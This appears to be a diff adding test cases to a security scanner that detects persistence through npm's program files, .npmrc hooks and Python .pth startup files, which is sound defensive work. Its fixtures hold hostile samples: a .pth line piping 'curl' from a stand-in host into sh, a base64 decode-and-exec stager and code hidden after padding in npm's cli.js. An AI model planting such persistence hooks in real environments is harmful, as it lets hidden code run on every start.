@@ -319,6 +319,46 @@ case(
 )
 
 case(
+    "python-startup-files-packaging-tools-write-are-clean",
+    why="Most Python environments hold several .pth files, and nearly all "
+        "of them run code: virtualenv's, setuptools' distutils shim, an "
+        "editable install's finder, a namespace package's long one-liner, "
+        "pytest-cov's exec. Reporting any of them would put a review line on "
+        "every Python developer's machine. A project's .venv is read even "
+        "though the walk never enters it. And a .pth outside site-packages "
+        "is not run by anything; PyTorch saves models with the extension, "
+        "so it is not even read.",
+    roots=["code"],
+    files={
+        "code/proj/.venv/lib/python3.12/site-packages/_virtualenv.pth": "import _virtualenv\n",
+        "code/proj/.venv/lib/python3.12/site-packages/distutils-precedence.pth":
+            "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; "
+            "enabled and __import__('_distutils_hack').add_shim(); \n",
+        "code/proj/.venv/lib/python3.12/site-packages/__editable__.proj-0.1.0.pth":
+            "import __editable___proj_0_1_0_finder; __editable___proj_0_1_0_finder.install()\n",
+        "code/proj/.venv/lib/python3.12/site-packages/google_auth-2.0.0-py3.12-nspkg.pth":
+            "import sys, types, os;has_mfs = sys.version_info > (3, 5);"
+            "p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('google',));"
+            "importlib = has_mfs and __import__('importlib.util');has_mfs and __import__('importlib.machinery');"
+            "m = has_mfs and sys.modules.setdefault('google', importlib.util.module_from_spec("
+            "importlib.machinery.PathFinder.find_spec('google', [os.path.dirname(p)])));"
+            "m = m or sys.modules.setdefault('google', types.ModuleType('google'));"
+            "mp = (m or []) and m.__dict__.setdefault('__path__',[]);(p not in mp) and mp.append(p)\n",
+        "code/proj/.venv/lib/python3.12/site-packages/pytest-cov.pth":
+            "import os, sys;exec('if \\'COV_CORE_SOURCE\\' in os.environ:\\n  try:\\n"
+            "    from pytest_cov.embed import init\\n    init()\\n  except Exception as exc:\\n"
+            "    sys.stderr.write(\"pytest-cov: Failed to setup subprocess coverage.\")\\n')\n",
+        "code/proj/.venv/lib/python3.12/site-packages/proj.pth": "/home/dev/code/proj/src\n",
+        "code/proj/models/weights.pth": "import os;os.system('curl http://example.invalid | sh')\n",
+    },
+    expect={
+        "exit": 0,
+        "findings": [{"level": "ok", "match": "6 Python startup files (.pth) checked, none runs anything unusual"}],
+        "must_not_report": ["[HIT]", "[review]"],
+    },
+)
+
+case(
     "node-modules-is-not-scanned",
     why="ADR-0004 and ADR-0025: node_modules is pruned, so a payload living "
         "only there is invisible to the content scan. This case exists to make "
@@ -702,6 +742,156 @@ host_case(
         "findings": [{"level": "info", "match": "an npm auth token is stored on disk"}],
         "must_not_report": NOTHING_FOUND,
         "must_not_print": ["npm_NOTAREALTOKEN0000000000"],
+    },
+)
+
+# npm's lib/cli.js as npm 10 ships it: four lines, a few hundred bytes.
+NPM_CLI = (
+    "const validateEngines = require('./cli/validate-engines.js')\n"
+    "const cliEntry = require('node:path').resolve(__dirname, 'cli/entry.js')\n\n"
+    "module.exports = (process) =>\n"
+    "  validateEngines(process, () => require(cliEntry))\n"
+)
+NPM_SHIM = "#!/usr/bin/env node\nrequire('../lib/cli.js')(process)\n"
+
+host_case(
+    "host-npm-program-file-with-indicator-is-confirmed",
+    why="The 2026-09-14 review: npm's lib/cli.js is replaced with a copy that "
+        "carries the payload, so every npm and npx command starts it again "
+        "and it survives every other step of a cleanup. An indicator in a "
+        "file npm runs before anything else has no innocent reading. It is "
+        "read through the host's system root like every other system path, "
+        "and the advice is to reinstall Node.js, because quarantining the "
+        "file leaves npm unable to run.",
+    host=host_state(files={
+        "root/usr/local/lib/node_modules/npm/lib/cli.js": NPM_CLI + "{{PAD}}{{STRONG}}\n",
+        "root/usr/local/lib/node_modules/npm/bin/npm-cli.js": NPM_SHIM,
+    }),
+    expect={
+        "exit": 2,
+        "findings": [{
+            "level": "HIT",
+            "match": "npm's own program file contains an indicator",
+            "path": "node_modules/npm/lib/cli.js",
+        }],
+        "must_print": ["Reinstall Node.js"],
+        "must_not_report": ["npm-cli.js"],
+    },
+)
+
+host_case(
+    "host-npm-program-file-padded-without-indicator-is-review",
+    why="The campaign rotates its markers, and the shape of this change does "
+        "not rotate with them: npm's entry file with code after a long run "
+        "of blank space is not how npm ships it. Without an indicator it is "
+        "not confirmed, and it is also not something to leave unread. Found "
+        "under a version manager in the home directory, where most "
+        "developers' npm lives.",
+    home={".nvm/versions/node/v20.11.0/lib/node_modules/npm/lib/cli.js":
+          NPM_CLI + "{{PAD}}require('child_process').spawn('node', ['-e', 'x'])\n"},
+    expect={
+        "exit": 1,
+        "findings": [{
+            "level": "review",
+            "match": "npm's own program file looks altered (code after a long run of blank space)",
+            "path": "v20.11.0/lib/node_modules/npm/lib/cli.js",
+        }],
+        "must_not_report": ["[HIT]"],
+    },
+)
+
+host_case(
+    "host-npm-program-files-as-shipped-are-clean",
+    why="npm installed for every user and npm installed by a version "
+        "manager, both as npm ships them. Nothing to report, and the section "
+        "says how many installations it looked at, so finding none is never "
+        "mistaken for not looking.",
+    host=host_state(files={
+        "root/usr/lib/node_modules/npm/lib/cli.js": NPM_CLI,
+        "root/usr/lib/node_modules/npm/bin/npm-cli.js": NPM_SHIM,
+    }),
+    home={".volta/tools/image/node/20.11.0/lib/node_modules/npm/lib/cli.js": NPM_CLI},
+    expect={
+        "exit": 0,
+        "findings": [{"level": "ok", "match": "2 npm installations checked"}],
+        "must_not_report": NOTHING_FOUND,
+    },
+)
+
+host_case(
+    "host-npmrc-onload-script-is-review",
+    why="onload-script makes npm load a script every time it starts, which "
+        "is the npm CLI persisting without any of npm's files changing. It "
+        "has legitimate uses, so without an indicator it is review. A "
+        "node-options line that only sizes the heap loads nothing and is not "
+        "listed.",
+    home={".npmrc": "onload-script=/home/dev/.config/npm/hook.js\n"
+                    "node-options=--max-old-space-size=4096\n"},
+    expect={
+        "exit": 1,
+        "findings": [{
+            "level": "review",
+            "match": "~/.npmrc runs a script whenever npm starts (onload-script)",
+            "path": "hook.js",
+        }],
+        "must_not_report": ["[HIT]", "node-options"],
+    },
+)
+
+host_case(
+    "host-npmrc-node-options-preloading-an-indicator-is-confirmed",
+    why="node-options with --require loads a module into every script npm "
+        "runs. One whose value carries an indicator is the payload starting "
+        "with every install, and is confirmed.",
+    home={".npmrc": "node-options=--require /home/dev/.cache/{{STRONG}}.js\n"},
+    expect={
+        "exit": 2,
+        "findings": [{
+            "level": "HIT",
+            "match": "~/.npmrc loads code into every script npm runs, and it contains an indicator (node-options)",
+        }],
+    },
+)
+
+host_case(
+    "host-python-startup-file-with-indicator-is-confirmed",
+    why="Python executes every line of a .pth file in site-packages that "
+        "begins with import, each time any Python starts. That is how the "
+        "pybitjs package re-runs itself (the 2026-10-05 review), and it is "
+        "quieter than anything on the Node side. One carrying an indicator "
+        "in this user's own site-packages is confirmed and can be "
+        "quarantined: Python skips a .pth that is not there.",
+    home={".local/lib/python3.12/site-packages/zz_helper.pth":
+          "import os;exec('{{STRONG}}')\n"},
+    expect={
+        "exit": 2,
+        "findings": [{
+            "level": "HIT",
+            "match": "Python startup file contains an indicator",
+            "path": "site-packages/zz_helper.pth",
+        }],
+    },
+)
+
+host_case(
+    "host-python-startup-file-that-decodes-and-runs-is-review",
+    why="A .pth line that decodes base64 and executes it is not something a "
+        "packaging tool writes, and it is how a stager hides. Without an "
+        "indicator it is not confirmed, so it is review. It sits in Python "
+        "installed for every user, read through the host's system root, so "
+        "the corpus can supply it as a file.",
+    host=host_state(files={
+        "root/usr/lib/python3.12/site-packages/sitecheck.pth":
+            "import base64;exec(base64.b64decode('cHJpbnQoMSk='))\n",
+    }),
+    expect={
+        "exit": 1,
+        "findings": [{
+            "level": "review",
+            "match": "Python startup file runs code that packages do not usually put there",
+            "path": "sitecheck.pth",
+        }],
+        "must_not_report": ["[HIT]"],
     },
 )
 
